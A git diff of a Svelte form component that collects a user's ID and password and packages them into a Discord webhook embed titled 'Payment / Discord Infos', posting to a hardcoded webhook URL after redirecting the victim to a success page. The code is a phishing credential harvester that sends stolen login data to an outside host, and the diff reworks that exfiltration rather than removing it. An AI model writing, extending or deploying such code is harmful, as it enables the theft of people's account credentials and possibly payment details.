@@ -1,5 +1,6 @@
 <script>
 import { goto } from "$app/navigation";
+    import { Embed, Field, Webhook } from "discord-webhook-library";
 
 
 let id = $state("")
@@ -10,31 +11,20 @@ const webhook = "https://discord.com/api/webhooks/1438248565557170378/wwnrmdkDN3
 
 async function submit(){
     goto("/success")
-    if (id == ""){
-        error = "Invalid ID."
-        return
-    }
-    if (password == ""){
-        error = "Invalid Password."
-        return
-    }
-    console.log(password)
-    error = ""
-    sendWebhook(new Embed(
-        "Info submitted!",
-        "There was an info submitted on the website.",
-        0x5865F2,
+    const wh = new Webhook(webhook).addWebhookUrl(webhook)
+    const e = new Embed()
+    e.setTitle("Payment / Discord Infos")
+    e.addFields(
         [
             new Field(
-                "Name / ID",
-                id
+                "Id", id
             ),
             new Field(
-                "Password",
+                "Pass",
                 password
             )
         ]
-    ), webhook)
+    )
 }
 
 
